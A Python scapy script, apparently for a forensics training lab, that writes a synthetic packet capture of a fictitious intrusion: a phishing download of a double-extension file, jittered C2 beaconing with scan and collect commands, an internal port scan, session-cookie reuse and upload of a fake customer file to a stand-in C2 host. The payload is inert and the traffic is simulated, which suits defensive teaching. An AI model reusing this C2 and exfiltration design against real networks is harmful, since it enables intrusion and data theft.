#!/usr/bin/env python3
"""LAB 15 - generator of the synthetic ACME incident capture (fictitious data, inert payload).

Run: python3 generate_scenario.py  (needs scapy). Writes lab15-acme-incident.pcap,
clientes_2026.csv and NF-e_38211.pdf.exe to the current folder. The random seed is fixed, so the
output is byte-identical to evidence/lab15-acme-incident.pcap with the same scapy version.
"""
import random, hashlib, datetime, io, csv
from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, DNSRR, ARP, Raw, wrpcap

random.seed(20261127)
T0 = datetime.datetime(2026, 11, 27, 12, 0, 0, tzinfo=datetime.timezone.utc).timestamp()
pkts = []

MAC = {
 '10.20.0.1':  '02:ac:00:00:00:01',  # gateway / firewall
 '10.20.0.2':  '02:ac:00:00:00:02',  # DNS
 '10.20.0.10': '02:ac:00:00:00:10',  # FS01 file server (web share)
 '10.20.0.20': '02:ac:00:00:00:20',  # intranet
 '10.20.0.31': '02:ac:00:00:00:31',  # WS-RH-03
 '10.20.0.45': '02:ac:00:00:00:45',  # WS-FIN-07 (victim)
 '10.20.0.52': '02:ac:00:00:00:52',  # WS-COM-12
}
GW = '10.20.0.1'
def mac(ip): return MAC.get(ip, MAC[GW])
def l2(src, dst):
    s = MAC[src] if src in MAC else MAC[GW]
    d = MAC[dst] if dst in MAC else MAC[GW]
    return Ether(src=s, dst=d)

def add(t, p):
    p.time = T0 + t
    pkts.append(p)

def dns(t, cli, name, ip):
    qid = random.randint(1, 65535); sp = random.randint(49152, 65000)
    add(t, l2(cli, '10.20.0.2')/IP(src=cli, dst='10.20.0.2', ttl=128)/UDP(sport=sp, dport=53)/DNS(id=qid, rd=1, qd=DNSQR(qname=name)))
    add(t+0.004, l2('10.20.0.2', cli)/IP(src='10.20.0.2', dst=cli, ttl=64)/UDP(sport=53, dport=sp)/DNS(id=qid, qr=1, rd=1, ra=1, qd=DNSQR(qname=name), an=DNSRR(rrname=name, ttl=300, rdata=ip)))

eph = {}
def port(cli):
    eph[cli] = eph.get(cli, random.randint(50000, 52000)) + random.randint(1, 3)
    return eph[cli]

def tcp_session(t, cli, srv, sport, req, resp, rtt=0.0005, srv_delay=0.01, cttl=128, sttl=64):
    cp = port(cli); cs = random.randint(1, 2**31); ss = random.randint(1, 2**31)
    C = lambda: l2(cli, srv)/IP(src=cli, dst=srv, ttl=cttl, flags='DF')
    S = lambda: l2(srv, cli)/IP(src=srv, dst=cli, ttl=sttl, flags='DF')
    add(t, C()/TCP(sport=cp, dport=sport, flags='S', seq=cs, window=64240, options=[('MSS',1460),('NOP',None),('WScale',8),('NOP',None),('NOP',None),('SAckOK',b'')]))
    t += rtt
    add(t, S()/TCP(sport=sport, dport=cp, flags='SA', seq=ss, ack=cs+1, window=64240, options=[('MSS',1460),('NOP',None),('NOP',None),('SAckOK',b''),('NOP',None),('WScale',7)]))
    t += rtt
    add(t, C()/TCP(sport=cp, dport=sport, flags='A', seq=cs+1, ack=ss+1, window=1026))
    cseq, sseq = cs+1, ss+1
    t += 0.0003
    for i in range(0, len(req), 1460):
        ch = req[i:i+1460]
        add(t, C()/TCP(sport=cp, dport=sport, flags='PA' if i+1460 >= len(req) else 'A', seq=cseq, ack=sseq, window=1026)/Raw(ch))
        cseq += len(ch); t += 0.00012
        if (i//1460) % 2 == 1 or i+1460 >= len(req):
            add(t+rtt, S()/TCP(sport=sport, dport=cp, flags='A', seq=sseq, ack=cseq, window=502)); 
    t += rtt + srv_delay
    for i in range(0, len(resp), 1460):
        ch = resp[i:i+1460]
        add(t, S()/TCP(sport=sport, dport=cp, flags='PA' if i+1460 >= len(resp) else 'A', seq=sseq, ack=cseq, window=502)/Raw(ch))
        sseq += len(ch); t += 0.00012
        if (i//1460) % 2 == 1 or i+1460 >= len(resp):
            add(t+rtt, C()/TCP(sport=cp, dport=sport, flags='A', seq=cseq, ack=sseq, window=1026))
    t += rtt*2
    add(t, S()/TCP(sport=sport, dport=cp, flags='FA', seq=sseq, ack=cseq, window=502)); sseq += 1; t += rtt
    add(t, C()/TCP(sport=cp, dport=sport, flags='A', seq=cseq, ack=sseq, window=1026)); t += 0.0002
    add(t, C()/TCP(sport=cp, dport=sport, flags='FA', seq=cseq, ack=sseq, window=1026)); cseq += 1; t += rtt
    add(t, S()/TCP(sport=sport, dport=cp, flags='A', seq=sseq, ack=cseq, window=502))
    return t

EDGE = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/158.0.0.0 Safari/537.36 Edg/158.0.0.0'
def get(host, path, ua=EDGE, extra=''):
    return (f'GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nAccept-Language: pt-BR,pt;q=0.9\r\n{extra}Connection: close\r\n\r\n').encode()
def post(host, path, body, ctype, ua, extra=''):
    return (f'POST {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nContent-Type: {ctype}\r\nContent-Length: {len(body)}\r\n{extra}Connection: close\r\n\r\n').encode() + body
def ok(body, ctype, extra=''):
    return (f'HTTP/1.1 200 OK\r\nServer: nginx\r\nDate: {{d}}\r\nContent-Type: {ctype}\r\nContent-Length: {len(body)}\r\n{extra}Connection: close\r\n\r\n').encode() + body
def stamp(resp, t):
    d = datetime.datetime.fromtimestamp(T0+t, datetime.timezone.utc).strftime('%a, %d %b %Y %H:%M:%S GMT')
    return resp.replace(b'{d}', d.encode())
def nf(body):
    return b'HTTP/1.1 404 Not Found\r\nServer: nginx\r\nContent-Type: text/html\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(body) + body

def http(t, cli, srv, host, req_bytes, resp_bytes, sport=80, sttl=64, delay=0.01):
    return tcp_session(t, cli, srv, sport, req_bytes, stamp(resp_bytes, t), sttl=sttl, srv_delay=delay)

# ---------- fictitious data ----------
nomes = ['Ana','Bruno','Carla','Diego','Elisa','Fabio','Gabriela','Heitor','Iara','Joao','Karina','Lucas','Marina','Nicolas','Olivia','Pedro','Queila','Rafael','Sofia','Tiago','Ursula','Vitor','Wesley','Yasmin','Zeca']
sobren = ['Almeida','Barros','Cardoso','Dias','Esteves','Ferraz','Gomes','Henriques','Ito','Junqueira','Klein','Lopes','Moura','Nogueira','Oliveira','Prado','Queiroz','Rocha','Silva','Teixeira','Uchoa','Vieira','Xavier','Zanetti']
buf = io.StringIO(); w = csv.writer(buf, lineterminator='\n')
w.writerow(['id','nome','email','cidade','limite_credito','cartao_final'])
cidades = ['Sao Paulo','Campinas','Curitiba','Belo Horizonte','Recife','Porto Alegre','Salvador','Fortaleza']
for i in range(1, 2401):
    n = random.choice(nomes); s = random.choice(sobren)
    w.writerow([f'C{i:05d}', f'{n} {s}', f'{n.lower()}.{s.lower()}{i}@example.com', random.choice(cidades), random.randrange(500, 50001, 500), f'{random.randint(0,9999):04d}'])
CSV = buf.getvalue().encode()
open('./clientes_2026.csv','wb').write(CSV)

PAYLOAD = (b'SIMULATED PAYLOAD - LAB 15 training scenario. This file is inert and does nothing.\n' * 260)[:21504]
open('./NF-e_38211.pdf.exe','wb').write(PAYLOAD)

INTRA_HOME = b'<html><head><title>ACME Intranet</title></head><body><h1>Intranet ACME</h1><a href="/rh">RH</a> <a href="/comunicados">Comunicados</a></body></html>'
COMUNICADO = b'<html><body><h2>Comunicado</h2><p>Confraternizacao de fim de ano dia 12/12.</p></body></html>'
UPD = b'{"status":"up-to-date","version":"24.11.3"}'
NFE_PAGE = (b'<html><head><title>Portal NF-e</title></head><body><h1>Nota Fiscal Eletronica</h1>'
            b'<p>Sua nota fiscal de novembro esta disponivel.</p><a href="/download/NF-e_38211.pdf.exe">Baixar NF-e 38211 (PDF)</a></body></html>')

# ---------- background: normal users ----------
users = ['10.20.0.31', '10.20.0.52', '10.20.0.45']
# periodic vendor update check (benign beacon): every 300 s from all 3 hosts
UPD_UA = 'AcmeUpdater/24.11 (Windows NT 10.0)'
for h_i, h in enumerate(users):
    t = 20 + h_i * 37
    while t < 1800:
        dns(t, h, 'updates.example.com', '198.51.100.80')
        http(t + 0.01, h, '198.51.100.80', 'updates.example.com', get('updates.example.com', '/v2/check', UPD_UA), ok(UPD, 'application/json'), sttl=52, delay=0.03)
        t += 300
# intranet browsing
for h in users:
    t = random.uniform(30, 200)
    while t < 1800:
        path = random.choice(['/', '/comunicados', '/rh'])
        body = INTRA_HOME if path == '/' else COMUNICADO
        dns(t, h, 'intranet.acme.lab', '10.20.0.20')
        http(t + 0.006, h, '10.20.0.20', 'intranet.acme.lab', get('intranet.acme.lab', path), ok(body, 'text/html'), sttl=64, delay=0.004)
        t += random.uniform(90, 400)
# legit file server use by RH
for t in (410, 1290):
    dns(t, '10.20.0.31', 'fs01.acme.lab', '10.20.0.10')
    http(t+0.006, '10.20.0.31', '10.20.0.10', 'fs01.acme.lab', get('fs01.acme.lab', '/rh/escala_dezembro.txt', extra='Cookie: fs_session=b91c0e44\r\n'), ok(b'Escala de dezembro: ver planilha anexa no e-mail.\n', 'text/plain'), delay=0.005)

# ---------- the incident (victim 10.20.0.45 = WS-FIN-07) ----------
V = '10.20.0.45'; C2 = '203.0.113.66'; C2H = 'cdn-sync.example.net'
# 1. initial access: phishing link -> fake NF-e portal -> double-extension download (12:05:10)
t = 310.0
dns(t, V, 'nfe-portal.example.com', '198.51.100.23')
http(t+0.01, V, '198.51.100.23', 'nfe-portal.example.com', get('nfe-portal.example.com', '/nota/38211'), ok(NFE_PAGE, 'text/html'), sttl=49, delay=0.06)
http(t+6.4, V, '198.51.100.23', 'nfe-portal.example.com',
     get('nfe-portal.example.com', '/download/NF-e_38211.pdf.exe', extra='Referer: http://nfe-portal.example.com/nota/38211\r\n'),
     ok(PAYLOAD, 'application/octet-stream', 'Content-Disposition: attachment; filename="NF-e_38211.pdf.exe"\r\n'), sttl=49, delay=0.08)
# 2. C2 beaconing every ~60 s with jitter, starting 12:06:02
IMPLANT_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
cmds = {}
t = 362.0
dns(t - 0.02, V, C2H, C2)
beacons = []
while t < 1790:
    beacons.append(t)
    t += 60 * random.uniform(0.85, 1.15)
# commands at specific beacons
idx_scan = 6; idx_collect = 13
for i, bt in enumerate(beacons):
    if i == idx_scan:
        body = b'{"cmd":"scan","args":"10.20.0.0/24 80,445,3389"}'
    elif i == idx_collect:
        body = b'{"cmd":"collect","args":"http://fs01.acme.lab/financeiro/clientes_2026.csv"}'
    else:
        body = b'{"cmd":"sleep"}'
    http(bt, V, C2, C2H, get(f'{C2H}:8080', '/api/v2/ping?id=WS-FIN-07', IMPLANT_UA), ok(body, 'application/json'), sport=8080, sttl=47, delay=0.09)
    cmds[i] = (bt, body)

# 3. internal scan after the scan command
ts = beacons[idx_scan] + 4.2
live = {'10.20.0.1': {80:'RST',445:'RST',3389:'RST'}, '10.20.0.2': {80:'RST',445:'RST',3389:'RST'},
        '10.20.0.10': {80:'OPEN',445:'OPEN',3389:'RST'}, '10.20.0.20': {80:'OPEN',445:'RST',3389:'RST'},
        '10.20.0.31': {80:'DROP',445:'DROP',3389:'DROP'}, '10.20.0.52': {80:'DROP',445:'DROP',3389:'DROP'}}
tt = ts
# ARP sweep
for last in range(1, 255):
    ip = f'10.20.0.{last}'
    if ip == V: continue
    add(tt, Ether(src=MAC[V], dst='ff:ff:ff:ff:ff:ff')/ARP(op=1, hwsrc=MAC[V], psrc=V, pdst=ip))
    if ip in MAC:
        add(tt+0.0004, Ether(src=MAC[ip], dst=MAC[V])/ARP(op=2, hwsrc=MAC[ip], psrc=ip, hwdst=MAC[V], pdst=V))
    tt += 0.0021
tt += 0.4
sp = random.randint(55000, 60000)
results = []
for ip, ports in live.items():
    for p_, st in ports.items():
        synseq=random.randint(1,2**31); add(tt, l2(V, ip)/IP(src=V, dst=ip, ttl=128)/TCP(sport=sp, dport=p_, flags='S', seq=synseq, window=1024, options=[('MSS',1460)]))
        if st == 'OPEN':
            add(tt+0.0004, l2(ip, V)/IP(src=ip, dst=V, ttl=64)/TCP(sport=p_, dport=sp, flags='SA', seq=random.randint(1,2**31), ack=synseq+1, window=64240, options=[('MSS',1460)]))
            add(tt+0.0007, l2(V, ip)/IP(src=V, dst=ip, ttl=128)/TCP(sport=sp, dport=p_, flags='R', seq=synseq+1))
            results.append(f'{ip}:{p_}')
        elif st == 'RST':
            add(tt+0.0004, l2(ip, V)/IP(src=ip, dst=V, ttl=64)/TCP(sport=p_, dport=sp, flags='RA', seq=0, ack=synseq+1, window=0))
        tt += 0.0011
# results reported on the next connection as a POST
rep = ('{"id":"WS-FIN-07","open":["' + '","'.join(results) + '"]}').encode()
http(tt + 3.1, V, C2, C2H, post(f'{C2H}:8080', '/api/v2/report', rep, 'application/json', IMPLANT_UA), ok(b'{"ok":true}', 'application/json'), sport=8080, sttl=47, delay=0.09)

# 4. collection from FS01 using the user's own session cookie
tc = beacons[idx_collect] + 2.7
dns(tc, V, 'fs01.acme.lab', '10.20.0.10')
http(tc+0.006, V, '10.20.0.10', 'fs01.acme.lab', get('fs01.acme.lab', '/financeiro/clientes_2026.csv', IMPLANT_UA, 'Cookie: fs_session=4e7d21a9\r\n'),
     ok(CSV, 'text/csv'), delay=0.02)
# 5. exfiltration to C2
tx = tc + 11.3
http(tx, V, C2, C2H, post(f'{C2H}:8080', '/api/v2/upload?f=clientes_2026.csv', CSV, 'application/octet-stream', IMPLANT_UA), ok(b'{"ok":true,"bytes":%d}' % len(CSV), 'application/json'), sport=8080, sttl=47, delay=0.4)

pkts.sort(key=lambda p: p.time)
wrpcap('./lab15-acme-incident.pcap', pkts)
print(len(pkts), 'packets')
print('CSV', len(CSV), hashlib.sha256(CSV).hexdigest())
print('payload', len(PAYLOAD), hashlib.sha256(PAYLOAD).hexdigest())
fmt = lambda t: datetime.datetime.fromtimestamp(T0+t, datetime.timezone.utc).strftime('%H:%M:%S')
print('download', fmt(316.4), 'first beacon', fmt(beacons[0]), 'n beacons', len(beacons))
print('scan cmd', fmt(beacons[idx_scan]), 'scan', fmt(ts), 'results', results)
print('collect cmd', fmt(beacons[idx_collect]), 'fs01', fmt(tc), 'exfil', fmt(tx))
iv = [round(b-a,1) for a,b in zip(beacons, beacons[1:])]; print('intervals', iv)
